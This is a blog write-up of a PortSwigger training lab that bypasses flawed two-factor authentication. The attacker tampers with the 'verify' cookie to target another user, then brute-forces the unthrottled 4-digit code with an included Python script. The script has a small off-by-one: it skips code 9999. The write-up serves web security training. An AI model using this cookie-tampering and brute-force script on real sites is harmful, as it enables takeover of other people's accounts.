---
layout: post
title: "Lab: 2FA broken logic [Write-up]"
date: 2026-07-13
platform: portswigger
vulntype: authentication
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** 2FA broken logic

**Platform:** PortSwigger

**Difficulty:** Medium  

---

# Description 

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

Your credentials: `wiener:peter`

Victim's username: `carlos`

You also have access to the email server to receive your 2FA verification code.

> Hint: Carlos will not attempt to log in to the website himself.

## Solution

Our task is to bypass the two-factor authentication for the user “carlos” without knowing the password and without access to his email account. 

We have valid credentials for the user “wiener”; we can log in to their account.

After entering our password, we are taken to the /login2 page, where we need to enter the 4-digit code that was sent to our email. Once we enter it, we can log in to our account. 

Let's intercept the request while the 4-digit code is being sent. Let's send an incorrect code and take a look at our request.

If we look at our request, we can see that the “cookie” field contains “verify=wiener,” and at the very bottom is the “mfa-code” we specified. What this request does is send the two-factor authentication code to the user's email address (wiener) and verify that the code received matches the one we specified.  

So where is the vulnerability here? We can use the `verify` function to send a code to the user “carlos” by changing the value to `verify=carlos`. Since we don't have access to “carlos”'s email, we need a way to find out the password. If we try sending 5 different requests with different MFA codes—for example, 1111, 5310, 3812, 4953, 3234, we’ll notice that the server doesn’t block our repeated requests. This means we can use a brute-force attack, trying different MFA codes until we find the right one. 

> I highly recommend that if you don't have BurpSuite Pro, you use the script, because it would take a very long time to try 10,000 passwords in the standard version. 

```python
import sys
import requests

# Portswigger Lab: 2FA broken logic
# Solve without burpsuite pro.
# Change target_url and target_2fa to your lab url!

target_url = "https://id.web-security-academy.net/login"  #Change this
target_2fa = "https://id.web-security-academy.net/login2" #Change this
username = "wiener"
password = "peter"
target_name = "carlos"

session = requests.Session()

post_data = "username=" + username + "&password=" + password
response = session.post(target_url, data=post_data)
headers = response.request.headers
print(headers.get('Cookie').replace(username, target_name))
new_cookie = headers.get('Cookie').replace(username, target_name)
headers.update(Cookie=new_cookie)

session.get(target_2fa, headers=headers)

for code in range(9999):
    num = "0" * (4 - len(str(code))) + str(code)
    post_2fa = "mfa-code=" + num
    print("Try " + post_2fa)
    response = session.post(target_2fa, data=post_2fa, headers=headers)
    if "Incorrect security code" not in response.content.decode():
        print("FOUND 2FA CODE " + num)
        print("Response code ", response.status_code)
        print(response.content.decode())
        sys.exit(0)
    if response.status_code != 200:
        print("Error response status: ", response.status_code)
        sys.exit(0)

```

Run this code, and after a short while, you'll see a response with a 302 status code—that will be the correct MFA code. 
